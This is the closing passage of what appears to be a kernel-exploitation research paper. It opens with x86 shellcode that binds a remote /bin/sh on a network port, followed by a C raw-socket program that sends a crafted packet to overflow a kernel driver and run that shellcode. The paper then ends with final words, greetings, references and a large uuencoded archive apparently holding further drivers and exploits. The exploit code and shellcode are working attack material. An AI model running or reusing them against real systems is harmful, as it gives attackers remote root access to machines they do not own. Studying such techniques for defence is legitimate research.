*%esi\n\/* end of stack frame recovery *\/\n\/* stage-2 shellcode *\/\n\"\\xaa\"                         \/\/  border stage-2 start\n\"\\xe8\\x00\\x00\\x00\\x00\"         \/\/  call   8 <func+0x8>\n\"\\x59\"                         \/\/  pop    %ecx\n\"\\x81\\xe1\\x00\\xe0\\xff\\xff\"     \/\/  and    $0xffffe000,%ecx\n\"\\x8b\\x99\\xf8\\x0f\\x00\\x00\"     \/\/  mov    0xff8(%ecx),%ebx\n\"\\x8b\\x81\\xfc\\x0f\\x00\\x00\"     \/\/  mov    0xffc(%ecx),%eax\n\"\\x89\\x03\"                     \/\/  mov    %eax,(%ebx)\n\"\\x8b\\x74\\x24\\x38\"             \/\/  mov    0x38(%esp),%esi\n\"\\x89\\x74\\x24\\x2c\"             \/\/  mov    %esi,0x2c(%esp)\n\"\\x31\\xc0\"                     \/\/  xor    %eax,%eax\n\"\\xb0\\x21\"                     \/\/  mov    $0x21,%al\n\"\\x40\"                         \/\/  inc    %eax\n\"\\x41\"                         \/\/  inc    %ecx\n\"\\x38\\x01\"                     \/\/  cmp    %al,(%ecx)\n\"\\x75\\xfb\"                     \/\/  jne    2a <func+0x2a>\n\"\\x41\"                         \/\/  inc    %ecx\n\"\\x8a\\x19\"                     \/\/  mov    (%ecx),%bl\n\"\\x88\\x1e\"                     \/\/  mov    %bl,(%esi)\n\"\\x41\"                         \/\/  inc    %ecx\n\"\\x46\"                         \/\/  inc    %esi\n\"\\x38\\x01\"                     \/\/  cmp    %al,(%ecx)\n\"\\x75\\xf6\"                     \/\/  jne    30 <func+0x30>\n\"\\xc3\"                         \/\/  ret\n\"\\x22\"                         \/\/  border stage-3 start\n\"\\x31\\xdb\"                     \/\/  xor    ebx, ebx\n\"\\xf7\\xe3\"                     \/\/  mul    ebx\n\"\\xb0\\x66\"                     \/\/  mov     al, 102\n\"\\x53\"                         \/\/  push    ebx\n\"\\x43\"                         \/\/  inc     ebx\n\"\\x53\"                         \/\/  push    ebx\n\"\\x43\"                         \/\/  inc     ebx\n\"\\x53\"                         \/\/  push    ebx\n\"\\x89\\xe1\"                     \/\/  mov     ecx, esp\n\"\\x4b\"                         \/\/  dec     ebx\n\"\\xcd\\x80\"                     \/\/  int     80h\n\"\\x89\\xc7\"                     \/\/  mov     edi, eax\n\"\\x52\"                         \/\/  push    edx\n\"\\x66\\x68\\x4e\\x20\"             \/\/  push    word 8270\n\"\\x43\"                         \/\/  inc     ebx\n\"\\x66\\x53\"                     \/\/  push    bx\n\"\\x89\\xe1\"                     \/\/  mov     ecx, esp\n\"\\xb0\\xef\"                     \/\/  mov    al, 239\n\"\\xf6\\xd0\"                     \/\/  not    al\n\"\\x50\"                         \/\/  push    eax\n\"\\x51\"                         \/\/  push    ecx\n\"\\x57\"                         \/\/  push    edi\n\"\\x89\\xe1\"                     \/\/  mov     ecx, esp\n\"\\xb0\\x66\"                     \/\/  mov     al, 102\n\"\\xcd\\x80\"                     \/\/  int     80h\n\"\\xb0\\x66\"                     \/\/  mov     al, 102\n\"\\x43\"                         \/\/  inc    ebx\n\"\\x43\"                         \/\/  inc    ebx\n\"\\xcd\\x80\"                     \/\/  int     80h\n\"\\x50\"                         \/\/  push    eax\n\"\\x50\"                         \/\/  push    eax\n\"\\x57\"                         \/\/  push    edi\n\"\\x89\\xe1\"                     \/\/  mov    ecx, esp\n\"\\x43\"                         \/\/  inc    ebx\n\"\\xb0\\x66\"                     \/\/  mov    al, 102\n\"\\xcd\\x80\"                     \/\/  int    80h\n\"\\x89\\xd9\"                     \/\/  mov    ecx, ebx\n\"\\x89\\xc3\"                     \/\/  mov     ebx, eax\n\"\\xb0\\x3f\"                     \/\/  mov     al, 63\n\"\\x49\"                         \/\/  dec     ecx\n\"\\xcd\\x80\"                     \/\/  int     80h\n\"\\x41\"                         \/\/  inc     ecx\n\"\\xe2\\xf8\"                     \/\/  loop    lp\n\"\\x51\"                         \/\/  push    ecx\n\"\\x68\\x6e\\x2f\\x73\\x68\"         \/\/  push    dword 68732f6eh\n\"\\x68\\x2f\\x2f\\x62\\x69\"         \/\/  push    dword 69622f2fh\n\"\\x89\\xe3\"                     \/\/  mov     ebx, esp\n\"\\x51\"                         \/\/  push    ecx\n\"\\x53\"                         \/\/  push    ebx\n\"\\x89\\xe1\"                     \/\/  mov    ecx, esp\n\"\\xb0\\xf4\"                     \/\/  mov    al, 244\n\"\\xf6\\xd0\"                     \/\/  not    al\n\"\\xcd\\x80\"                     \/\/  int     80h\n\"\\x22\"                         \/\/  border stage-3 end\n\"\\xbb\";                        \/\/  border stage-2 end\n\/* end of shellcode *\/\nstruct twsk_chunk\n{\nint type;\nchar buff[12];\n};\nstruct twsk\n{\nint chunk_num;\nstruct twsk_chunk chunk[0];\n};\nvoid fatal_perror(const char *issue)\n{\nperror(\"issue\");\nexit(1);\n}\nvoid fatal(const char *issue)\n{\nperror(\"issue\");\nexit(1);\n}\n\/* packet IP cheksum *\/\nunsigned short csum(unsigned short *buf, int nwords)\n{\nunsigned long sum;\nfor(sum=0; nwords>0; nwords--)\nsum += *buf++;\nsum = (sum >> 16) + (sum &0xffff);\nsum += (sum >> 16);\nreturn ~sum;\n}\nvoid prepare_packet(char *buffer)\n{\nunsigned char *ptr = (unsigned char *)buffer;;\nunsigned int i;\nunsigned int left;\nleft = TWSK_PACKET_LEN - sizeof(struct twsk) - sizeof(struct iphdr);\nleft -= SIZE_JMP;\nleft -= sizeof(shellcode)-1;\nptr += (sizeof(struct twsk)+sizeof(struct iphdr));\nmemset(ptr, 0x00, TWSK_PACKET_LEN);\nmemcpy(ptr, shellcode, sizeof(shellcode)-1); \/* shellcode must be 4\nbytes aligned *\/\nptr += sizeof(shellcode)-1;\nfor(i=1; i < left\/4; i++, ptr+=4)\n*((unsigned int *)ptr) = DEFAULT_VSYSCALL_RET;\n*((unsigned int *)ptr) = DEFAULT_VSYSCALL_JMP;\nptr+=4;\nprintf(\"buffer=%p, ptr=%p\\n\", buffer, ptr);\nstrcpy(ptr, JMP); \/* jmp -500 *\/\n}\nint main(int argc, char *argv[])\n{\nint sock;\nstruct sockaddr_in sin;\nint one = 1;\nconst int *val = &one;\nprintf(\"shellcode size: %d\\n\", sizeof(shellcode)-1);\nchar *buffer = malloc(TWSK_PACKET_LEN);\nif(!buffer)\nfatal_perror(\"malloc\");\nprepare_packet(buffer);\nstruct iphdr *ip = (struct iphdr *) buffer;\nstruct twsk *twsk = (struct twsk *) (buffer + sizeof(struct\niphdr));\nif(argc < 2)\n{\nprintf(\"Usage: .\/sendtwsk ip\");\nexit(-1);\n}\nsock = socket(AF_INET, SOCK_RAW, IPPROTO_RAW);\nif (sock < 0)\nfatal_perror(\"socket\");\nsin.sin_family = AF_INET;\nsin.sin_port = htons(12345);\nsin.sin_addr.s_addr = inet_addr(argv[1]);\n\/* ip packet *\/\nip->ihl = 5;\nip->version = 4;\nip->tos = 16;\nip->tot_len = TWSK_PACKET_LEN;\nip->id = htons(12345);\nip->ttl = 64;\nip->protocol = TWSK_PROTO;\nip->saddr = inet_addr(\"192.168.200.1\");\nip->daddr = inet_addr(argv[1]);\ntwsk->chunk_num = NEGATIVE_CHUNK_NUM;\nip->check = csum((unsigned short *) buffer, TWSK_PACKET_LEN);\nif(setsockopt(sock, IPPROTO_IP, IP_HDRINCL, val, sizeof(one)) < 0)\nfatal_perror(\"setsockopt\");\nif (sendto(sock, buffer, ip->tot_len, 0, (struct sockaddr *) &sin,\nsizeof(sin)) < 0)\nfatal_perror(\"sendto\");\nreturn 0;\n}\n< \/ >\n------[ 4 - Final words\nWith the remote exploiting discussion ends that paper. We have presented\ndifferent scenarios and different exploiting tecniques and 'notes' that we\nhope you'll find somehow useful. This paper was a sort of sum up of the\nmore general approaches we took in those years of 'kernel exploiting'.\nAs we said at the start of the paper, the kernel is a big and large beast,\nwhich offers many different points of 'attack' and which has more severe\nconstraints than the userland exploiting. It is also 'relative new' and\nimprovements (and new logical or not bugs) are getting out.\nAt the same time new countermeasures come out to make our 'exploiting\nlife' harder and harder.\nThe first draft of this paper was done some months ago, so we apologies if\nsome of the information here present could be outdated (or already\npresented somewhere else and not properly referenced). We've tried to add\na couple of comments around the text to point out the most important\nrecent changes.\nSo, this is the end, time remains just for some greets. Thank you for\nreading so far, we hope you enjoyed the whole work.\nA last minute shotout goes to bitsec guys, who performed a cool talk\nabout kernel exploiting at BlackHat conference [24]. Go check their\npaper\/exploits for examples and covering of *BSD and Windows systems.\nGreetz and thanks go, in random order, to :\nsgrakkyu: darklady(:*), HTB, risk (Arxlab), recidjvo (for netfilter\ntricks), vecna (for being vecna:)).\ntwiz: lmbdwr, ga, sd, karl, cmn, christer, koba, smaster, #dnerds &\n#elfdev people for discussions, corrections, feedbacks and just long\n'evening\/late night' talks.\nA last shotout to akira, sanka, metal_militia and yhly for making the\nmonday evening a _great_ evening [and for all the beers offered :-) ].\n------[ 5 - References\n[1] - Intel Architecture Reference Manuals\nhttp:\/\/www.intel.com\/products\/processor\/manuals\/index.htm\n[2] - SPARC V9 Architecture\nhttp:\/\/www.sparc.com\/standards\/SPARCV9.pdf\n[3] - AMD64 Reference Manuals\nhttp:\/\/www.amd.com\/it-it\/Processors\/\nProductInformation\/0,,30_118_4699_875^7044,00.html\n[4] - MCAST_MSFILTER iSEC's advisory\nhttp:\/\/www.isec.pl\/vulnerabilities\/isec-0015-msfilter.txt\n[5] - sendmsg local buffer overflow\nhttp:\/\/www.securityfocus.com\/bid\/14785\n[6] - kad, \"Handling Interrupt Descriptor Table for fun and profit\"\nhttp:\/\/www.phrack.org\/archives\/59\/p59-0x04.txt\n[7] - iSEC Security Research\nhttp:\/\/www.isec.pl\n[8] - Jeff Bonwick, \"The Slab Allocator: An Object-Caching Kernel Memory\nAllocator\"\nhttp:\/\/www.usenix.org\/publications\/library\/proceedings\/\nbos94\/bonwick.html\n[9] - Daniel P. Bovet & Marco Cesati\n\"Understanding the Linux Kernel\", 3rd Edition [ISBN 0-596-00565-2]\n[10] - Richard McDougall and Jim Mauro\n\"Solaris Internals\" , 2nd Edition [ISBN 0-13-148209-2]\n[11] - Mel Gorman, \"Linux VM Documentation\"\nhttp:\/\/www.skynet.ie\/~mel\/projects\/vm\/\n[12] - sd, krad exploit for sys_epoll vulnerability\nhttp:\/\/www.securiteam.com\/exploits\/5VP0N0UF5U.html\n[13] - noir, \"Smashing The Kernel Stack For Fun And Profit\"\nhttp:\/\/www.phrack.org\/archives\/60\/p60-0x06.txt\n[14] - UltraSPARC User's Manuals\nhttp:\/\/www.sun.com\/processors\/documentation.html\n[15] - pr1, \"Exploiting SPARC Buffer Overflow vulnerabilities\"\nhttp:\/\/www.emsi.it.pl\/sploits\/solaris\/sparcoverflow.html\n[16] - horizon, Defeating Solaris\/SPARC Non-Executable Stack Protection\nhttp:\/\/www.emsi.it.pl\/sploits\/solaris\/horizon.html\n[17] - Gavin Maltby's Sun Weblog, \"SPARC System Calls\"\nhttp:\/\/blogs.sun.com\/gavinm\/entry\/sparc_system_calls\n[18] - PaX project\nhttp:\/\/pax.grsecurity.net\n[19] - Solar Designer, \"Getting around non-executable stack (and fix)\"\nhttp:\/\/insecure.org\/sploits\/linux.libc.return.lpr.sploit.html\n[20] - Sebastian Krahmer, \"x86-64 buffer overflow exploits and the\nborrowed code chunks exploitation technique\"\nhttp:\/\/www.suse.de\/~krahmer\/no-nx.pdf\n[21] - Laurent BUTTI, Jerome RAZNIEWSKI & Julien TINNES\n\"Madwifi SIOCGIWSCAN buffer overflow\"\nhttp:\/\/lists.grok.org.uk\/pipermail\/full-disclosure\/2006-December\n\/051176.html\n[22] - sgrakkyu, \"madwifi linux remote kernel exploit\"\nhttp:\/\/www.milw0rm.com\/exploits\/3389\n[23] - sd & devik, \"Linux on-the-fly kernel patching without LKM\"\nhttp:\/\/www.phrack.org\/archives\/58\/p58-0x07\n[24] - Joel Eriksson, Karl Janmar & Christer berg, \"Kernel Wars\"\nhttps:\/\/www.blackhat.com\/presentations\/bh-eu-07\/Eriksson-Janmar\n\/Whitepaper\/bh-eu-07-eriksson-WP.pdf\n------[ 6 - Sources - drivers and exploits [stuff.tgz]\nbegin 644 stuff.tgz\nM'XL(`!J,'T8``^P\\^W\/;-M+Y59KI_X!1&X>2Y8B49-FQZLRHL=SXXM?XD;87\nM9S@4\"=H\\4Z1*4H[<-\/>WW^X\")$&*=I*>D]XW7]C:)@'LXK$\/[\"X6B9.YZW8>\nM?=%'AV=C?1W_&AOK.GT;_3[]E<\\C0Q_HW6Y77Q]T'^E&M[?>?\\36O^RPQ#.\/\nM$RMB[%'RSOOC_G8\\BN^I3R>2_OT_\\L1$?[Z8^5^.\"3Z'_EV]!_3O]8QO]\/\\J\nMCT+_.+)L\/HTOG]H\/W`>NQT#0NX+^QL#(Z&]L##8,H\/]Z3S<>L:^RB\/_\/Z=]I\nML>_JK,5RXK,U%O\/`@7<V.M@9]!DR1^@EHAW].KORXJP87F=6E+#09<D59_#J\nMV3YG3T9)8MG77G!)Q788<;;%7O$HX#X;\"UBL\/`P3'C\\1>-]%7I+P@+EAQ*S`\nM81'WN15SAX4!.[Z\"$5ZWH;MXSMF@_U2`T.\\._\/ZN_KT7V\/[<X>S'.'&\\\\.G5\nM\\T*9=QE8?JEP'GC0MMPR<7QOLE08P6B76WI!4BZ\\C3O)[8S'%>7`:^7FKATD\nMY6%AT^G4\"LK%]A5?&BQB#>UK+O!\"E<-=+^#L>\/3SV#S=^^>8Z0L0,#VO.3@8\nM'9NCG9T3IFDWH>>TFOJB*]FV66IV>+Z_KS33EYM1\/X?G!\\SH;A;[\/WOQTGQQ\nMM#\/6)D##=NBZ,4_:-Y8_YTUV`6033TO3YK\"(O:Z9L%93T^PK*VHU$82M,@'4\nM;+)MEK5J:@*'VIEK)99O\\B@*0FW1OFVR]VP&7V&D+9I#X%0OT6[AY0\/\"`\"7G\nM=L)L8\/`K)V*M2],*;,_WK>AVB\/4@$9=^.+%\\%L-0@\/FH.Y:$++X-;&#FB%M.\nM3#R*,@\/<]UW])O2MQ`.N1P)[-H.A$A*36FPS?:B.]GQOQSS:W3T=GS$C+ST]\nM&[UXA>5IW>!97HGKJ-:Q9^N($1>+79-,F:#))V_>LFTL;UPL)OQBP3<O%GH\/\nM?G3\\:;#EI]-A;!K>X.L\/^J+'-]N\/>>P1@L'ZQ:(\/\"#8G`-R_6'374T0J0@7!\nMX\\MX\"UBD_3BR%HQ0](R+A?VLJM_R&!:PFHB\"VXLV_F),,]8)QR;@<)]!]S9T\nM:=PU%\\1A3V=R'D;7)BR$8`\/&;MB?,HA_<7KMZ[KEZBC=\\\\F@\/_&255B9S>=B\nM-+`81N5*WK&J&JY&$T;CB-'T8\"IN]U,0R.D@\/7+P#20\"_Z3)!#R=#-\\L34;\/\nM)[..R]F_#Z$R&7W1_Q+SV7B@^2\"[.9\\TEHS=G$4^ELUGG[D<!)ZM\">'@*\"R;\nMGS0?L1SW,1M)'XBO?>^@$)GE.\/@*K-\\G\\2-PUP50XU\/&`KN)F(\\4&9R%\\VDB\nMD\\_\"MHNS,\/IB%KHK!->]=UD06?S.FEW&3%OO9].W-^`O*A_\\@67H3NY00+^+\nMZ7<G;=S,@\"+QK%F)Q8!OPU!_EK$8\\@%<QN9]N&`4_0&,I'O\/B\/H#1'\/?D'3X\nM[O8^,K$>8)%C@;H6Z_98K[L&2\\W:K-<#@XC>[9CV(Z43\/5V]KOK34)9=Z40^\nM[?)@W<;P$[@HXLGOC$PQW!$]AW%O9CJA2?LO%@#&][CQT[;5LJ++FP7N6.Q]\nMHS\/Q@DY\\U6@SM#@^#+'5#\"RNQ-4:<\\_9?NQ<!%!YR1,.GUJS22WX@MLW7%.@\nM\":=`DC:!O@U\\_R`&UFGE)JP[#^S$`^-R:LUBW+OM:[([[1!,JYA?3GF04.LU\nMEML^Z;-4B%86+(7FSI-YQ\"62&1@`S24<R%Q+.+\"P6\\0AAI0CZ>`,T+B86M?<\nMO\/[7?#HK+\"RM>HN@3)@3+\"V8D;\/4?M,$9Y,!UV;\"Z&NSXY.C,_-D\/-KYD]Y^\nM.=D[&[<9V8B'1X>_'1R=G_Z)7\\<G>Z]'9V-ZW]W[=;P#*.!_,*NP9\\_5E&ZW\nM\"7YWM+<_WFD*4T\\UT1HX*J`6T07_RT9^Q7T?%TX=?6:(MJ4I6SUF\\3K^=?SB\nMLT:?#K[8\\^=-`&2(3^W9;1%+6[7,VBSV_N\"AJREES;4,7K&6E>GFAB*QOL+Y\nMU>W+)B0MF'SN@RM9EVW&5A31S80'&0^]Y<041K`)$AJ\"RW:K88W6<IN:(\"-P\nM%W$<BF-1Y@5#`V$MWP]M+7-26OUFJF&(((`O`4S;S\/;#@&MN6XK\"*E-`V%H?\nMQKY_=#@V=T__E\"]`L?3]=._GEZ\/#'?GU^H#40T9QQ\/\\CTXFZ!=I2ERIQ`\\_F\nMFO%,0,8^YS--+B=HO'D4X%#5-4*CWT3=(N2.!:&R#JE6>]-Z*WT):A\\A@6=(\nM8$77S7*\"O[L\"]P*ZQ??W@B%A#IF\/(7GT?>I6*4[-VG-T=4P?_.IMMJ[KP[2-\nM&+S\\_(!_\/LA)H*LUZ(-#EL2VE@X\\*P0X`K+B*4L='ZT1.=\"X`2Y^8WO4T\"+T\nMVN3RR4428*H+!@`@!Q:8$.4N)AS<*SXLE%ENPB.A;#*'$8P.'L>(=EB)EWZ_\nM`<_T[5`0QT=G2K\"B\"R,W71B[25H&\">?&144*9E54T$+H-;<5%DR=W_NTZ.G+\nMT<EX1U4\\;JQJ'M')YRH<N:C2748<Z>+2T&\/;\"DPLU<1D03^%T6TZ.YRK1_W#\nM,FO>MC%DWH_I7-;P:W55Y32QC-[;IV*]B]ZX0`V2Z;6RA6E*KLH(Y<RGTUN`\nM*WG[5;!K_68*GO4K^`'@B2%E[6?@7,9(W,04C\"K_@WF%&ZS8PN6<72^*$S\"Y\nMV,RZY#&&`UQ_'E_1YYH-KX@\/-V@`%B!;+(^KT$:\/'[_\"(_=Q02C2IX3*%&`%\nMBK7S)<2.S&`^O8N(.A(Q;;1$PK]\"B:;<VS]DQA,-F328&7O!)<A.Q..YGVA+\nMDM<\"TREGN%3IC6B&`+G%'L\/^\",W7',]U><0#FT.9[PO=1\\!KS\\6\"Y)]$L[7T\nM4S`%C7%Y>')<?Y7C\/W?`)0EIEQEMK<S+Z=*6!@_ZR,]5=[JL::@*_K93XSEM\nMD\\X0ZM:>HZ*W0UB>T$<AU;)60-A>5Z$L#DC8(\\5PF!24,C*Q>51#@&G;E?(#\nMK!_S)`V?W<`XE1V.Y8-Q0+\/!\/.;!-8E\"8;M\"?5OJ76(O]MMBR11-1*T<SP->\nM+L&+.4%S92MD=\\YGJ?$-]V4(3RW'$\"]3RU=7Y3B_6D<@L[#<&A2UR8V`[6&C\nM6[#6II879#*PO#L*$18?X(7IPN\\J,AV>`^1U2K<K!)?VG$T1RB03T8Z*-EPX\nMXP$X:3#.#NZW(\"Y'YLG.+R?9%HBMMMF:4;7Q(7\"Z\\8G^I0\"(O;FTB[M.JLM+\nMDK1\"LH-`F<D^#Q`\"BZJV=-$?V((QEUB9ZG5)8_`VR'>\/5&?LTKX`!J[<*M\"C\nMG$6XAUBHNGBTU02=(1\"`D8?3T?+9?8D5^]A:D;EMSLC@KC;P,Y-6]:TK3%ED\nMN'LM6<%@2WN>H$*OFSN$Y&S8;[IO,UZ*9Z#5$QPBG7?,+\"_21KOF^>'>K^#Z\nM'('G<WH&%M@!>7:QG;MV`BZU]4NKE2,KKIDJ'%5V3_'8H-1^V5XA8N<G`H90\nM__*@38.)ZF_;3#\"IGJU380BTCQ3ME:J=>$6%2AM>PT`UHC\"LU-[\/K_92$OX%\nM(9\"6IR[TS-]]?OGM^>\\>]?P??+G(BQ\\^#^13\\S\\V-C`)`\/,_P$T=?,O_^!I\/\nM!?U)=]C7#Y<&<G_^A[X^T'M9_D^?Z#]8!W;YEO_Q%9Y.B[(H6$;T6FV-L5\/!\nM\"NS<3R+K]'AT\\B+-W\/!#&T_&*1@7WO#(]<-W62H(H\")L#Y\\?0F@_*ST$(3!B\nM7J_(\"ZE*]JC*]:A.R;@CUZ,ZU:,BTR,O:L#4H%&CGIWS_W2^\"QLP,YYUZ^)P\nM?S)WW\\#7VV&]CAU!L]0^G\\%&[X;L?9I(03:2\\%W!MK(NLQ,;\\,IF42B\"&%\".\nM)T15,('_;J;\"!\/\/I!\"P.(!M4Q-`RPZ+`@T5A)@(>7O-#(H\"?!][O0(H4\".-I\nMU7`JH#)6`(\"^@77`9KX+]+($*F$DALLHG,\\8\\(A#H9DJ#'%IT#%Z^\\!.Q='.\nM<X!Y\"0\"L7I^A;K@;A,^+H^2NR^W$N^%5<)<YW&555V).=\\+PR[OZJ@)$8W:6\nM1!A<BBA:.,P`\\0O74%E.!1\"]\/>R25O`\/KO:(WRJ4-P4G\"+GGU>06V!VQ?)\"\\\nM:R;#G\/-'^WL_'QZ\/=E)4O;SJ^'3O<\/?(\/!Z=O:2J1@>1=V+NNQV!\"21H'F\"&\nM%R@#\/P2M`2X'13^;]5P^TD[3;_P:+DE\"^K@.#\"[_2)TR92S\"*3LZW\/^MJ:!Q\nMF<8R[RPKSD>1C4;D)PEO34&0\/M+,7C\/RJ@_Y@-#9`HN\\S62TL+F\"LTG=<*;A\nM5U\/!FIOP]5('V\/)I2OXZ=)&G*1V?CDY^\/DU3CO1%KZ>S53Q2&AAU\"B](%6].\nM>6&A:4CPT`FO..!E#?15D\"'D$2_[,%QNSX.;6=K^;'QRL'V3&+H.$(V?1J<O\nMS9=[IV=')[]M=QQ^TPGFOM]HUQL5A:P!^T\\21K>%EH)UD'#;>%Z\\U8GI]SR.\nM.ME+7D3[7*?TB=5IGWC05.@TG55.R=0_\/I;;%*:0<<YNPWF;36_9L5R1BR+]\nM8YY$=,@MSB=+%9<5%=7'X!@VO9D5VWF)AI!(YBSM;+0[-G>\/J8%RGFULPJ\\^\nMTMO(FNZ<'QS\\1B=L*(,8G,#]JU%70DWUY>VH_*!@?:P-GA7ERD;&K:`OTPZG\nM<E]A3&E2%\/[\\:<U@_VPC.N'ASB2;9X`RED6MGHR>M.4&W%2:\"!A@RDRGJ)5*\nM\"&2-G:\/O39H\/SZ80\"L\/&C((@`HT**T<%F&47JV616\\VTXD>ZQ\/A&UA]U)Y$7\nMQ@JSA,Y6T*3HD451J%G=9EVE#%0Y,3UI[%P1@NFE,1&&T8=,Q%6,\/KVMKK+F\nMDAHC\"D`--%_\\)!^85X'`>1O)C*4JJ$C7:HUM*F-,GM)NDP58H:W\"[\\E3N;Q0\nM7*G+<WXNJ'*50-#4\"^W$)UUKM-E*HG204L*=!TR&NO#<4\\&@*LA*98R2^+?:\nM_Q7^GS!*'[\"\/C_A_>G=@E\/S_@='[YO]]E>=[SPU`O=?,L_'IV:NQ^3+5]GE)\nMS<AVBQJ6F91F<O1ZMV:4RO='\/V%QMUB,&^\/.R6X-++IJ5?Z^7@-!JM7(E*S7\nM\"LJ\\)NV28?U['CB>^RW@^+!\/A?S[UASLDNCAHD`?D_^-P2\"\/_ZRC_&]L;'2_\nMR?_7>#H4)6$EFF,0:)\\B\/6D41S;X7POQE\",\\V84>&3Z);?(G\\#K#(\/TII2%W\nM.C!XQ\\&!4*\\^*!],_*1$:\/UBL?X,_AHB<9AWX=N6J<BZR,S&Y-J!+A)M75NV\nMUQN4^@P@+H<B]V)AZ0+%!,$WX'M#9&CC\/0U]0W1E8<*W0:\"V+-(WQ14(NLHA\nM<H.'=QC<Z`;X6@-\/\"^\/LG*[L[NG#HLFAR#_Z,28H;I'<\\(\"W`.^7?Z.K;_1*\nM]_\\&?;S_^TW^O_PCX[^2]E%.?8H#%W4`B@<*\\A\/*(7K\"G,B[`94`;JW#IV$`\nMF[N5<.$'(](:\/,!X.SE6=C\/W`QY9$\\\\'R>=QJDV^C#+Y2[J$L5(<E\\S_I9CQ\nM<ABY(F1<%5K^[P+&A3\"T$D<F@A0\"R3OCUWLOQD\"#!L4HJ$$CJST\\.H8J??%,\nM+UT_HPN#M4V*\/W<Z%75]_=E`B1'EMPQK(C>[6\"\/]V)K1+98?C$Y?L=J_\\_Q?\nM\"I;EL<##L]'A'FJM6L,*$BOP,,\"79JO5)N$\\<$S[BMO7;[IOM]]3!@K^`BN1\nM+Q)@\"9&_67-\"TTO0\\Q+1V%KM?`\\]::J$.@4\/*=):,:.5JMEC\\\/H>ZQ<)N'>4\nMW#IM:`I<$\\NLAJ8O=G<QW@:ZE6*@TQE>!L1L<!;\/PG<!LA9U>\\D3,PK#1&KN\nM_\"9$&O?*@SB-M;4@G$6AS`\"AS\\@NQ,\\$^%+8S\/>\"^0)!CD^-[5O]5K^X^.'>\nM*%K9:X?G,P-K)>`'\"+.I`;6\/1KA<Z8N#S\/$H@H&^:;7>@EI`,.9:L().&F:C\nM*!AFWE.P$\\F5%.Z\"P#L,`@#8Y!9`KSE`V'Q&=5>@1WP>;;$$RW6,\\DO5@LO\"\nM&6A`(+HC,A1SFH.:Q%2:&Q\/:FK*MEKDYE'U#Z3.\")T2N8EV):L57820\"\/(5B\nM:-ABE`-7*&H*9+1P.3.\"@K*OA8;+\\T4Q*0;%5N0_BG09IF&:(@:P05J:;&6%\nM\"E:-Y:+N<E$O+Q*Q(($+,W)2)&B\"%.+,=\/L@TR&\\G@HHJBQQNP66!413:Y`\\\nM;PT;A+D!Z^&S'P9MICU^S&\/@@P89<R)11@AO3KGQWC&;A;`\\,;,N,4D)=BW<\nM1T0[+Q\">*;04N&?S^,H:9I:B*)R&-SZCOMKXQUID(P&N`\"51*J7F&A4URP\".\nMPWXP]#($]NI7(\/FADH,(>)*U1*9EK4+1+)R5T$&)E;[C?:WT'13-4\/VAXBW0\nM;5Y#8__6E`T`)*=9!^&1MP>$$$F_WG,24[P2(Z\/&-@:@>'UOZE&\\+]\/A>+\\;\nM8)EI6@EPYF2><-\/4M!ELRMQ!18HXZ2JUU)!X702L\"].-K\"DW*7>T*$&(T111\nMWCK9':6GT!@C#=0.6XI+&G1KAT*F8NQJ\\X@4?AI-3#MB*_EF5I9+AEG\"LF<5\nM9$W!M00CTD4EC$:AS56!:)7E6R42H-QUMA5,K2Q<K=[\\RCNM5-?T0.]W5U9>\nM;[BS=7;7X<\\[+V+=#:S?4T4*''14\/LW\"O0D\"E(Y.7DR*$(`4\"J<'<C+\\GZ)K\nMHV'4QI60CI.\\UI779SC$41LU^X\";BA_S:HPB\/5:@K)?O;62,,60H2\/)^2H$I\nM6F@Q_,&CT,1L4FV)C06[IFB+&T&EU.2'\/&TI!])35`Z%?CHZ\/]PQQX=G)[^Q\nM]7JA3QR.J)9'Q,)T6M(`^#HLFU0Q%):M*2A\"@:^EYY%.\\E3^ZP_:9DL9B!AA\nM82RSB&-^@(D9N2:21EI5L\/^(\\QJZ,3=DM6)B^CP]!:]6(#+34T,L*_),;'=7\nMUYOLQQ^9,6CBR+)*,\/MD\\;\">GPB(4QF:1GZ0CO=!'NN;BS7QA\\X+U$Z+7W32\nMVA5W1XQF;NQ)Z:XD;1&;!%<B`=6WC3)I2(^DYX$U\\>E?O$`=PG!UB?'38\\K<\nM@I)GTI+II;(ICH(D2@Z%(*1,I7=2E^:<WD^ES;Z=6P<%^5&AAD)T9$0$7\\`X\nMM-L%VUKPA>1,=.5-O(-@DG,GONEU226W,LEKLQ:Q&>5T@^18N\",GD=2^63\/!\nM=XK`*G>BF\"\"!TO9^.N#J;S&%&D`,!*:\\\\CN)D8]RV3*L$!C<:H7-\"4O;5D_'\nMR(-LL_QHK\"VX3J1\\B'DC1\\%BL^=,)COD+9!)D]#3B`#&6V%[2S6IM()F^=:V\nMF:-UQ>W,I47!L6W)6TS@A'CV1]ER):?OTFV%*GX0>1,Y4'K(J$Y>LF+A>\/#5\nM^.30W#MZ<;9OCO;WCUZ8F\"G29DKWJ1\"FZ>A+DQ\/\\6(GHSEE**Q_XD86^DV6'\nM)1$C*Y'<&''I&+-PT.855]G>A9%4@RDOXZVPC#E3]\\$.IS.PS@@PX.\\(,9C+\nMGB.*]G;.P!E\"!IWPY!T'\"X94-GE%>X>O1_M[.T?'BAU.':9J$H')`-]BCQ?I\nM58'R[D(S;94%K-0(-,<`VBW3;1O6`S9?3804FJM&B;:3.=[FVA;5PX^0%1WB\nM<259Z^I5#O@H1Q?2U2P[BKB:M\"2%\">;*Y?[Q[)Z,T^&H.O[3V2M#<\"=WY?$*\nM5?U2%\/GO#EU^>Q[@4<__>.`D[^('3\/R6S_WQ_^XZ'O:7__V__L:W^\/_7>.3Y\nMG[B*)*A\/D?\\3\/@T3?F?HGR\\LBBK][P7P[_JW\\3X_#3P_2[P_SA]P&#=\/.MZL\nMNGSN4`5&&MTHG-(A\")N&SMS'?SPN__?V1K^:9[^<OGKQ\\OSP%>OIV!YH(N:D\nMQ.TI:I^5'+T>G^SN'_UB'H['F#O;5>K^<7\"L.,]XG\/E,G#7BF22>\/;KN?]K[\nMUO6V<63!\\Y?ZOGX'M&;B2(HDZV99ML>9XXF5;N\\XMM=VNF<VG>52%&5S+(D:\nM4?+E=&>>?>L\"@`!)^9).IV?WF(EM\"<2E4\"@4\"H5\"57(D@\/*7JTN4I(0$\"65;\nM-X\\@NB=[;_[:\/W<\/^T>P%2K9D%=2TA42%>]\/RKA,6P!C@F[X)U-O\\RJGEG(F\nM-9S1G>4T=*?'Y\\>BO5DPCT\/>[KT_\/'=_.\/O[V1L0JMQ3LF@=P1-TFFVQ.B-\"\nMUKCU@6$UVGY#T##2C('L0T7)\\P\"`(3^!]7K!&\\\\NO>T_B\/HZWIP&`0U>;(M6\nML[\/9Z;6[\/1`_>\\SX&H+O[&V+C68KE:NI<S637*U>